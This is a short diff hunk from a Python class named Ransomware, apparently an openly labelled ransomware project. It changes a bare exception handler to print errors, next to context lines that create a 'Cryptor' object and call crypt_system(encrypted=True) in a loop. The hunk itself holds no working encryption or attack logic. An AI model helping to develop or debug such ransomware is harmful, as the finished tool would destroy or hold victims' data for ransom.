@@ -168,7 +168,8 @@ class Ransomware:
 					print(f"[+] New Cryptor Object Created As : {self.crypter}")
 					self.crypt_system(encrypted=True)
 					flag=False
-			except :
+			except Exception as e:
+				print(f"[-] Exception Rose As : \n{e}")
 				pass
 			sleep(10)
 
